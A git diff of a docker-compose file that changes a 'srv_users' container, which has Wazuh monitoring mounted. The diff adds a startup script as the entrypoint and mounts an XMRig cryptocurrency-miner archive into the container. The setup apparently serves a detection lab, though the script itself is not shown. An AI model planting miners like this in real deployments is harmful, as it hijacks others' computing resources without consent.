@@ -181,8 +181,11 @@ services:
     hostname: srv_users
     container_name: srv_users
     cap_add:
-      - NET_ADMIN     
+      - NET_ADMIN
+    entrypoint: sh /usr/local/bin/start.sh
     volumes:
+      - ./srv_users/start.sh:/usr/local/bin/start.sh
+      - ./srv_users/xmrig-6.24.0-linux-static-x64.tar.gz:/tmp/xmrig.tar.gz
       - ./srv_users/home/users:/home/users/ # Персистентность данных пользователей
       - ./srv_users/wazuh/var/ossec/etc:/var/ossec/etc
       - ./srv_users/wazuh/var/ossec/queue:/var/ossec/queue
